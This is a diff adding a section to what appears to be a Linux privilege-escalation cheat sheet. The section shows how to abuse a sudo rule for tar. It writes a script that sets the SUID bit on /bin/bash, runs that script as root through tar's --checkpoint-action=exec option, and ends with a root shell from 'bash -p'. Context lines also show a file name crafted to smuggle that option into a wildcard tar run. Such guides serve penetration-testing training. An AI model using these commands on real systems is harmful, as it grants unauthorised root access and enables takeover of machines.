@@ -1403,6 +1403,36 @@ echo "" > "/home/user/--checkpoint-action=exec=sh runme.sh"
 id
 ```
 
+#### Sudo tar with fixed backup args
+
+If `sudo -l` allows tar with a wildcard or broad trailing arguments, you may not need to wait for a cron job. Pass tar's checkpoint options directly after the fixed arguments.
+
+```bash
+sudo -l
+# (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
+```
+
+Create a root action script:
+
+```bash
+cat > /tmp/shell.sh << 'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+chmod +x /tmp/shell.sh
+```
+
+Run tar with checkpoint execution:
+
+```bash
+cd /tmp
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh\ /tmp/shell.sh .
+/bin/bash -p
+id
+```
+
+The option name must be `--checkpoint-action=exec=...`; `--checkpoint=action=exec=...` is a typo and will not execute the command.
+
 ### SUID and SGID Executables --GTFO Bins
 
 * Find all the SUID/SGID executables on the Debian VM:
